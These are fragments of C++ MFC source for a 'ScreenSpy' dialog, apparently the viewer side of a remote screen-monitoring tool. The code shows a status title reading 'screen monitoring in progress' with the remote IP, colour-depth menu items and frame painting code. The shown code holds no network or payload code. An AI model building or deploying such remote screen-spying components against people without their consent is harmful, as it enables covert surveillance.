...
DWORD WINAPI CScreenSpyDlg::ShowFPSThread(LPVOID lpParam)
{
	...
	while (TRUE)
	{
		CString str; Sleep(100);
		str.Format(_T("屏幕监控中\\\\%s (%d * %d) 速度-%d"), pThis->m_IPAddress, pThis->m_lpbmi_full->bmiHeader.biWidth, 
...
void CScreenSpyDlg::OnReceive()
{
	...
	str.Format(_T("屏幕监控中\\\\%s (%d * %d) 速度-%d"), m_IPAddress, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight,
...
//     	pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 位彩色(&E)");
		pSysMenu->AppendMenu(MF_STRING|MF_GRAYED, IDM_DEEP_16, "16位增强颜色");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32位真彩颜色");
...
void CScreenSpyDlg::OnPaint() 
{
	...
	EnterCriticalSection(&m_cs);
	BitBlt(m_hCurrWndDC, 0, 0, m_lpbmi_full->bmiHeader.biWidth, m_lpbmi_full->bmiHeader.biHeight, m_hLastMemDC, iHScrollPos, iVScrollPos, SRCCOPY);
	LeaveCriticalSection(&m_cs);
